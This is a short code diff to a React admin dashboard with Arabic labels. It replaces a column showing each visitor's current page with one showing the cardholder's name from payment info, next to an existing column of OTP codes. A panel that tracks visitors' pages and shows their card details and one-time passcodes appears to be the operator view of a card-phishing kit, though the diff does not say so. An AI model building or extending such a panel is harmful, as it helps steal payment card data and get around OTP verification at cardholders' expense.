@@ -319,7 +319,7 @@ export default function AdminDashboard() {
                     الإجراءات
                   </th>
                   <th className="px-4 py-3 text-right font-medium text-gray-600">
-                    الصفحة
+                    حامل البطاقة
                   </th>
                   <th className="px-4 py-3 text-right font-medium text-gray-600">
                     OTP
@@ -358,8 +358,8 @@ export default function AdminDashboard() {
                           </button>
                         </div>
                       </td>
-                      <td className="px-4 py-3 text-gray-700">
-                        {row.currentPage === "/" ? "الرئيسية" : row.currentPage}
+                      <td className="px-4 py-3 text-gray-700 font-medium">
+                        {row.paymentInfo?.cardholderName || "-"}
                       </td>
                       <td className="px-4 py-3">
                         {row.code ? (
